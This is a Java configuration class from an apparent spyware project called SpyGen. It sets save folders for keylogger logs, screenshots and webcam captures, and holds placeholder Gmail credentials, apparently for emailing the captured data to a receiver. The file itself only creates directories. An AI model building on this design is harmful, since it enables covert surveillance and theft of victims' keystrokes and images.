package com.houarizegai.spygen.global;

import java.io.File;

public class Settings {
    // Path you want to save results
    public static String savePath = "/home/houari/Desktop/";
    public static final String KEYLOGGER_PATH = savePath + "SpyGen/keyloggers/";
    public static final String SCREENSHOT_PATH = savePath + "SpyGen/screenshots/";
    public static final String WEBCAM_PATH = savePath + "SpyGen/webcam/";

    /* Mail information */
    public static String senderMail = "sender@gmail.com";
    public static String senderPassword = "sender password (of gmail)";
    public static String receiverMail = "receiver@gmail.com";

    static {
        initSaveFolders();
    }

    private static void initSaveFolders() {
        createFolderIfNotExists(savePath + "SpyGen/");
        createFolderIfNotExists(KEYLOGGER_PATH);
        createFolderIfNotExists(SCREENSHOT_PATH);
        createFolderIfNotExists(WEBCAM_PATH);
    }

    private static void createFolderIfNotExists(String folderPath) {
        File directory = new File(folderPath);
        if (!directory.exists())
            directory.mkdir();
    }

}
